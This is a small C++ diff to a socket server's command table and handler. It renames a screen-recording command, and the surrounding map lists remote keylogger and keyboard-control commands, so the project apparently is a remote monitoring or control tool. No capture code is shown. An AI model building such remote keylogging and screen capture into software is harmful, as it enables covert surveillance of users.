@@ -23,7 +23,7 @@ std::unordered_map<std::string, MessageType> ServerSocket::messageMap =  {
     {"enableKeyboard", ENABLE_KEYBOARD},
     {"enableKeylogger", ENABLE_KEYLOGGER},
     {"disableKeylogger", DISABLE_KEYLOGGER},
-    {"screenRecording", SCREEN_RECORDING}
+    {"recording", SCREEN_RECORDING}
 };
 
 ServerSocket::ServerSocket() : 
@@ -403,7 +403,7 @@ void ServerSocket::initializeHandlers() {
     handlers[SCREEN_RECORDING] = [this](SOCKET &clientSocket, const std::string& command) {
         auto tokens = parseCommand(command);
         if (tokens.size() != 2) {
-            sendResponse(clientSocket, "Usage: screenRecording &lt;duration_in_seconds&gt;");
+            sendResponse(clientSocket, "Usage: recording &lt;duration_in_seconds&gt;");
             return;
         }
 
